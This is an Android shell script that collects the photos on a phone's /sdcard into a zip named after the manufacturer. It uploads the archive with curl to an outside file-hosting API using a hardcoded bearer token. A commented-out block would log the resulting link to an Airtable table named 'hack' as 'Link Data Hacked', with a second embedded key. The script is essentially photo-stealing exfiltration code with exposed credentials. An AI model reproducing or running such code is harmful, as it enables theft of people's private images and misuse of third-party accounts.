
f=$(getprop ro.product.manufacturer)

#find /sdcard/ -type f \( -iname '[^.]*.jpg' -o -iname '[^.]*.jpeg' \) -exec zip -j -u -1 -9 $f.zip {} \;
link=$(curl https://api.upload.io/v2/accounts/W142hbk/uploads/form_data \
     -H "Authorization: Bearer public_W142hbkCwf6QUP8QgssrRVKuBVAT" \
     -F file=@OPPO.zip)
echo "$link"
#curl -v -X POST https://api.airtable.com/v0/app2lvk25rvdVfAdt/hack \
#  -H "Authorization: Bearer keyXhIoWmuaY303oX" \
#  -H "Content-Type: application/json" \
#  --data '{
#  "records": [
#     {
#       "fields": {
#         "Name": "Link Data Hacked",
#         "link": "'"$link"'"
#            }
#        }
#    ]
#}'
